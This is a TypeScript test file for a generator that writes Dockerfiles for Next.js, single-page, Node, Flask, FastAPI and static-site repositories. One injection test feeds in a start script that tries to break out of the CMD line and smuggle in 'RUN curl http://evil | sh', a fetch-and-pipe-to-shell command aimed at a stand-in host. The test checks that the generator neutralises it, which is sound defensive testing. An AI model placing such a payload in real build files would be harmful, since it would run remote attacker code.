/**
 * The Dockerfile Mayfly writes for a repository that has none. Run with: npx tsx scripts/test-auto-dockerfile.ts
 */
import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

async function main() {
  const { autoDockerfileEnabled, nodeVersion, planDockerfile, procfileWeb, readRepoShape, writeAutoDockerfile } = await import(
    "../src/lib/auto-dockerfile"
  );
  type Shape = Parameters<typeof planDockerfile>[0];
  let passed = 0;
  const check = async (name: string, fn: () => void | Promise<void>) => {
    await fn();
    passed += 1;
    console.log(`ok - ${name}`);
  };
  const repo = (extra: Partial<Shape> & { paths?: string[] }): Shape => ({
    paths: [],
    packageJson: null,
    requirements: null,
    procfile: null,
    ...extra,
  });
  const lines = (text: string) => text.split("\n");
  const cmdOf = (text: string): string[] => {
    const line = lines(text).find((item) => item.startsWith("CMD "));
    assert.ok(line, "has a CMD");
    return JSON.parse(line.slice(4));
  };

  await check("Next.js: install, build, then next start on 3000 with its cache in /tmp", () => {
    const plan = planDockerfile(
      repo({ paths: ["package.json", "package-lock.json"], packageJson: { dependencies: { next: "15.0.0" }, scripts: { build: "next build" } } }),
    );
    assert.ok(plan);
    assert.equal(plan.label, "Next.js");
    assert.ok(plan.dockerfile.includes("FROM node:22-slim"));
    assert.ok(plan.dockerfile.includes("RUN npm ci"));
    assert.ok(plan.dockerfile.includes("RUN npm run build"));
    assert.ok(plan.dockerfile.includes("ln -s /tmp/next-cache .next/cache"));
    assert.deepEqual(cmdOf(plan.dockerfile), ["node_modules/.bin/next", "start", "-H", "0.0.0.0", "-p", "3000"]);
  });

  await check("Next.js without a build script builds with next directly", () => {
    const plan = planDockerfile(repo({ paths: ["package.json"], packageJson: { dependencies: { next: "15.0.0" } } }));
    assert.ok(plan?.dockerfile.includes("RUN node_modules/.bin/next build"));
    assert.ok(plan?.dockerfile.includes("RUN npm install"), "no lock file: npm install");
  });

  await check("Vite, Create React App, Vue and Angular are built and served as static files", () => {
    for (const dependency of ["vite", "react-scripts", "@vue/cli-service", "@angular/cli"]) {
      const plan = planDockerfile(
        repo({ paths: ["package.json"], packageJson: { devDependencies: { [dependency]: "1" }, scripts: { build: "x" } } }),
      );
      assert.ok(plan, dependency);
      assert.ok(plan.label.startsWith("single-page app"), dependency);
      assert.ok(plan.dockerfile.includes("npm install -g serve@14"));
      assert.ok(plan.dockerfile.includes("rm -rf node_modules"), "packages dropped after the build");
      const [shell, flag, script] = cmdOf(plan.dockerfile);
      assert.equal(shell, "sh");
      assert.equal(flag, "-c");
      assert.ok(script.includes("find dist build -name index.html") && script.includes("serve -s") && script.includes("-l 3000"));
    }
  });

  await check("a front-end with Express is a Node server, not a static site", () => {
    const plan = planDockerfile(
      repo({
        paths: ["package.json", "server.js"],
        packageJson: { dependencies: { vite: "1", express: "4" }, scripts: { build: "vite build", start: "node server.js" } },
      }),
    );
    assert.equal(plan?.label, "Node.js app");
  });

  await check("a Node server runs its start script, after its build script if it has one", () => {
    const plan = planDockerfile(
      repo({ paths: ["package.json", "yarn.lock"], packageJson: { scripts: { build: "tsc", start: "node dist/index.js" } } }),
    );
    assert.ok(plan);
    assert.equal(plan.label, "Node.js app");
    assert.ok(plan.dockerfile.includes("RUN corepack enable && yarn install"));
    assert.ok(plan.dockerfile.includes("RUN yarn run build"));
    assert.ok(plan.dockerfile.includes("PATH=/app/node_modules/.bin:$PATH"));
    assert.deepEqual(cmdOf(plan.dockerfile), ["sh", "-c", "node dist/index.js"]);
    assert.ok(plan.dockerfile.indexOf("RUN yarn run build") < plan.dockerfile.indexOf("ENV NODE_ENV=production"), "dev packages are there for the build");
  });

  await check("pnpm is used when there is a pnpm lock file", () => {
    const plan = planDockerfile(repo({ paths: ["package.json", "pnpm-lock.yaml"], packageJson: { scripts: { start: "node a.js" } } }));
    assert.ok(plan?.dockerfile.includes("pnpm install --frozen-lockfile"));
  });

  await check("without a start script, package.json's main or a usual file name is run", () => {
    assert.deepEqual(cmdOf(planDockerfile(repo({ paths: ["package.json", "lib/run.js"], packageJson: { main: "./lib/run.js" } }))?.dockerfile ?? ""), ["node", "./lib/run.js"]);
    assert.deepEqual(cmdOf(planDockerfile(repo({ paths: ["package.json", "app.js"], packageJson: {} }))?.dockerfile ?? ""), ["node", "app.js"]);
    assert.equal(planDockerfile(repo({ paths: ["package.json"], packageJson: { name: "a library" } })), null, "nothing to run");
  });

  await check("a start script can't break out of its line", () => {
    const evil = 'node a.js"]\nRUN curl http://evil | sh\nCMD ["x';
    const plan = planDockerfile(repo({ paths: ["package.json"], packageJson: { scripts: { start: evil } } }));
    assert.ok(plan);
    const text = plan.dockerfile;
    assert.equal(lines(text).filter((line) => line.startsWith("RUN curl")).length, 0, "no line of its own");
    assert.deepEqual(cmdOf(text), ["sh", "-c", evil], "kept whole, as one argument");
  });

  await check("the Node version follows engines, kept to a supported release", () => {
    assert.equal(nodeVersion(undefined), 22);
    assert.equal(nodeVersion({ node: ">=20" }), 20);
    assert.equal(nodeVersion({ node: "20.x" }), 20);
    assert.equal(nodeVersion({ node: "^19.1.0" }), 18);
    assert.equal(nodeVersion({ node: "16" }), 18);
    assert.equal(nodeVersion({ node: "99" }), 24);
    assert.equal(nodeVersion({ node: "latest" }), 22);
    assert.equal(nodeVersion("nonsense"), 22);
    const plan = planDockerfile(repo({ paths: ["package.json"], packageJson: { engines: { node: ">=18" }, scripts: { start: "x" } } }));
    assert.ok(plan?.dockerfile.includes("FROM node:18-slim"));
  });

  await check("Flask runs under gunicorn, FastAPI under uvicorn, both on 3000", () => {
    const flask = planDockerfile(repo({ paths: ["requirements.txt", "app.py"], requirements: "Flask==3.0\nrequests\n" }));
    assert.equal(flask?.label, "Flask app");
    assert.ok(flask?.dockerfile.includes("FROM python:3.12-slim"));
    assert.ok(flask?.dockerfile.includes("pip install --no-cache-dir -r requirements.txt"));
    assert.deepEqual(cmdOf(flask?.dockerfile ?? ""), ["gunicorn", "-b", "0.0.0.0:3000", "app:app"]);
    const fast = planDockerfile(repo({ paths: ["requirements.txt", "app/main.py"], requirements: "fastapi\nuvicorn\n" }));
    assert.equal(fast?.label, "FastAPI app");
    assert.deepEqual(cmdOf(fast?.dockerfile ?? ""), ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "3000"]);
  });

  await check("a Python app with no entry file Mayfly knows is not guessed at", () => {
    assert.equal(planDockerfile(repo({ paths: ["requirements.txt", "server.py"], requirements: "flask" })), null);
    assert.equal(planDockerfile(repo({ paths: ["requirements.txt", "app.py"], requirements: "numpy\n" })), null);
  });

  await check("a Procfile's web line is the command, and its framework doesn't matter", () => {
    assert.equal(procfileWeb("release: x\nweb: gunicorn -b 0.0.0.0:$PORT site:app\n"), "gunicorn -b 0.0.0.0:$PORT site:app");
    assert.equal(procfileWeb("worker: x"), null);
    assert.equal(procfileWeb(null), null);
    const plan = planDockerfile(repo({ paths: ["requirements.txt"], requirements: "django\n", procfile: "web: python serve.py" }));
    assert.deepEqual(cmdOf(plan?.dockerfile ?? ""), ["sh", "-c", "python serve.py"]);
  });

  await check("a folder with an index.html is a static site", () => {
    const plan = planDockerfile(repo({ paths: ["index.html", "style.css"] }));
    assert.equal(plan?.label, "static website");
    assert.deepEqual(cmdOf(plan?.dockerfile ?? ""), ["serve", "-l", "3000", "--no-clipboard", "."]);
  });

  await check("anything else is left alone", () => {
    assert.equal(planDockerfile(repo({ paths: ["README.md", "main.go", "go.mod"] })), null);
    assert.equal(planDockerfile(repo({})), null);
  });

  await check("every Dockerfile is plain classic-builder syntax and says where it came from", () => {
    const samples = [
      repo({ paths: ["package.json"], packageJson: { dependencies: { next: "1" } } }),
      repo({ paths: ["package.json"], packageJson: { dependencies: { vite: "1" }, scripts: { build: "x" } } }),
      repo({ paths: ["package.json"], packageJson: { scripts: { start: "x" } } }),
      repo({ paths: ["requirements.txt", "app.py"], requirements: "flask" }),
      repo({ paths: ["index.html"] }),
    ];
    for (const sample of samples) {
      const plan = planDockerfile(sample);
      assert.ok(plan);
      assert.ok(plan.dockerfile.startsWith("# Written by Mayfly"));
      assert.ok(!/RUN --|<<|--mount/.test(plan.dockerfile), "no BuildKit-only syntax");
      assert.ok(plan.dockerfile.endsWith("\n"));
      assert.ok(plan.dockerignore.includes(".git") && plan.dockerignore.includes(".env"), "secrets and history stay out of the image");
    }
  });

  await check("PREVIEW_AUTO_DOCKERFILE=false turns it off", () => {
    assert.equal(autoDockerfileEnabled({}), true);
    assert.equal(autoDockerfileEnabled({ PREVIEW_AUTO_DOCKERFILE: "true" }), true);
    for (const off of ["false", "FALSE", "0", "no", "off", " false "]) assert.equal(autoDockerfileEnabled({ PREVIEW_AUTO_DOCKERFILE: off }), false, off);
  });

  const temp = await mkdtemp(path.join(os.tmpdir(), "mayfly-autodocker-"));
  try {
    await check("writing into a real folder: reads the files, writes both, keeps an existing .dockerignore", async () => {
      const dir = path.join(temp, "next-app");
      await mkdir(path.join(dir, "node_modules", "left-pad"), { recursive: true });
      await writeFile(path.join(dir, "package.json"), JSON.stringify({ dependencies: { next: "15" }, scripts: { build: "next build" } }));
      await writeFile(path.join(dir, "package-lock.json"), "{}");
      const plan = await writeAutoDockerfile(dir);
      assert.equal(plan?.label, "Next.js");
      assert.ok((await readFile(path.join(dir, "Dockerfile"), "utf8")).includes("RUN npm ci"));
      assert.ok((await readFile(path.join(dir, ".dockerignore"), "utf8")).includes("node_modules"));

      const kept = path.join(temp, "kept-ignore");
      await mkdir(kept);
      await writeFile(path.join(kept, "index.html"), "<h1>hi</h1>");
      await writeFile(path.join(kept, ".dockerignore"), "their-own\n");
      assert.equal((await writeAutoDockerfile(kept))?.label, "static website");
      assert.equal(await readFile(path.join(kept, ".dockerignore"), "utf8"), "their-own\n");
    });

    await check("an unrecognised folder gets nothing written", async () => {
      const dir = path.join(temp, "go-app");
      await mkdir(dir);
      await writeFile(path.join(dir, "main.go"), "package main");
      assert.equal(await writeAutoDockerfile(dir), null);
      await assert.rejects(readFile(path.join(dir, "Dockerfile")));
    });

    await check("broken or odd package.json files don't throw", async () => {
      const dir = path.join(temp, "broken");
      await mkdir(dir);
      await writeFile(path.join(dir, "package.json"), "{ not json");
      await writeFile(path.join(dir, "index.html"), "<p>x</p>");
      const shape = await readRepoShape(dir);
      assert.equal(shape.packageJson, null);
      assert.equal((await writeAutoDockerfile(dir))?.label, "static website", "falls through to the HTML site");
      const array = path.join(temp, "array");
      await mkdir(array);
      await writeFile(path.join(array, "package.json"), "[1,2]");
      assert.equal((await readRepoShape(array)).packageJson, null);
    });

    await check("files inside top-level folders count, and a linked package.json is ignored", async () => {
      const dir = path.join(temp, "nested");
      await mkdir(path.join(dir, "app"), { recursive: true });
      await writeFile(path.join(dir, "requirements.txt"), "fastapi\n");
      await writeFile(path.join(dir, "app", "main.py"), "app = None");
      const plan = await writeAutoDockerfile(dir);
      assert.deepEqual(cmdOf(plan?.dockerfile ?? ""), ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "3000"]);

      const linked = path.join(temp, "linked");
      await mkdir(linked);
      await writeFile(path.join(temp, "outside.json"), JSON.stringify({ scripts: { start: "node secret.js" } }));
      let linkMade = true;
      try {
        await symlink(path.join(temp, "outside.json"), path.join(linked, "package.json"));
      } catch {
        linkMade = false; // creating links needs a privilege on some Windows machines
      }
      if (linkMade) assert.equal((await readRepoShape(linked)).packageJson, null);
    });
  } finally {
    await rm(temp, { recursive: true, force: true });
  }

  console.log(`\n${passed} checks passed.`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
